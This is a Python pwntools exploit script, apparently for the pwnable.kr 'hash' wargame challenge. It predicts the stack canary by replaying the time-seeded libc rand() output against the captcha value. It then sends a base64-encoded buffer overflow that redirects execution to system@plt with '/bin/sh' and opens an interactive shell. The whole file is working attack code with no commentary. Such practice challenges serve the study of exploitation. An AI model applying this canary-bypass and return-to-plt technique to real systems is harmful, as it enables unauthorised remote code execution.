from pwn import *
import base64
from ctypes import *
from ctypes.util import find_library

if __debug__:
	script='''b*process_hash+226
	c
	'''
	# p=gdb.debug('./hash',script)
	p=process('./hash')
else:
	p=remote('pwnable.kr',9002)

e=ELF('./hash')
system_plt=e.plt['system']
g_buf=e.symbols['g_buf']

p.recvuntil('cha : ')
num=int(p.recvline())
print('num = '+hex(num))
libc = CDLL(find_library('c'))
libc.srand(libc.time(0))
array=[libc.rand() for i in range (8)]
canary=num-array[1]-array[2]+array[3]-array[4]-array[5]+array[6]-array[7]
canary=canary&0xffffffff	

print('canary = '+hex(canary))

# payload='/bin/sh\n'+'a'*(512-8)
payload='a'*(512)
payload+=p32(canary)+'aaaa'*3+p32(system_plt)
payload+='aaaa'+p32(g_buf+720)

payload=base64.b64encode(payload)+'/bin/sh\x00'

p.sendline(str(num))

p.recvline()
p.recvline()
p.sendline(payload)

p.interactive()
p.close()